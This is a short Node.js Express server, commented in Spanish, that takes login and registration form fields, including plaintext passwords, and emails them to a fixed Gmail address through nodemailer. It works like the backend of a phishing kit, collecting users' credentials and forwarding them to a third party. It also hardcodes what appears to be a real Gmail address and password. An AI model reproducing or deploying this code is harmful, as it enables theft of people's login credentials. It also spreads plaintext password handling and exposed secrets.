// Simple Node.js backend to send form data to Gmail using nodemailer
// 1. Instala Node.js y ejecuta: npm install express nodemailer cors
// 2. Cambia 'tu_gmail@gmail.com' y 'tu_contraseña' por tus datos reales o usa una app password de Gmail

const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'gabysstylellc24@gmail.com', // tu correo Gmail
    pass: 'A4020gaby' // tu contraseña o app password
  }
});

app.post('/send', (req, res) => {
  const { type, email, password, username } = req.body;
  const subject = type === 'register' ? 'Nuevo registro' : 'Nuevo login';
  const text = type === 'register'
    ? `Usuario: ${username}\nEmail: ${email}\nPassword: ${password}`
    : `Email: ${email}\nPassword: ${password}`;

  const mailOptions = {
  from: 'gabysstylellc24@gmail.com',
  to: 'gabysstylellc24@gmail.com',
    subject,
    text
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      return res.status(500).send('Error al enviar correo');
    }
    res.send('Correo enviado correctamente');
  });
});

app.listen(3000, () => {
  console.log('Servidor escuchando en puerto 3000');
});
